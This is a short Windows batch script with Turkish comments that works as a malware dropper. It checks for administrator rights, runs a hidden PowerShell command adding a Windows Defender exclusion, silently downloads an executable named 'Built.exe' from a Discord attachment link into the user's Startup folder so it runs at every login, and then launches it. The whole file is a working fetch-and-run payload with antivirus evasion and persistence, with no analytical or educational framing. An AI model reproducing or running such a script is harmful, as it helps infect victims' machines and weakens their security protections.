REM --> İzin kontrolü yapılıyor
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> Admin kontrolü kaldırıldı

:gotAdmin
pushd "%CD%"
CD /D "%~dp0"

powershell -w hidden -c Add-MpPreference -ExclusionPath ""

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/1167894826243604540/1167896181205114961/Built.exe?ex=654fcb14&is=653d5614&hm=5d97110543b28051790c17f14c3775fa0ee380741a890eb7b0c262a6b041bb94&"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"

if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"